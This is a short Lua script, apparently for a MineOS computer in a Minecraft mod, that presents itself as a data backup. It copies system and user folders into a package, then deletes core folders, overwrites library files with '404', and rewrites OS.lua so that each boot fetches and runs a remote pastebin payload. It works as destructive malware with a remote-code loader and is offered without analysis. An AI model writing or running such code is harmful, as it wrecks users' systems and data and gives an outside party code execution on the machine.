local internet = require("INTERNET")
local compressor = require("compressor")
local filesystem = require("filesystem")

-- Move all of data to /eltxcry
filesystem.copy("/Libraries", "/eltxcry/libraries")
filesystem.copy("OS.LUA", "/eltxcry")
filesystem.copy("/Icons", "/eltxcry")
filesystem.copy("/Users", "/eltxcry")
filesystem.copy("/Application", "/eltxcry")
filesystem.copy("/Extensions", "/eltxcry")
filesystem.copy("/Mounts", "/eltxcry")
filesystem.copy("/Localizations", "/eltxcry")
compressor.pack("/data-backup.pkg", {
	"/eltxcry"
})
filesystem.remove("/eltxcry")
-- Write ALL files

filesystem.write("OS.lua", "pastebin run hQYzUhR9")
filesystem.write("Libraries/Event.lua", "404")
filesystem.write("Libraries/Network.lua", "404")
filesystem.remove("/Libraries")
filesystem.remove("/Localization")
filesystem.remove("/Wallpapers")
filesystem.remove("/LMounts")
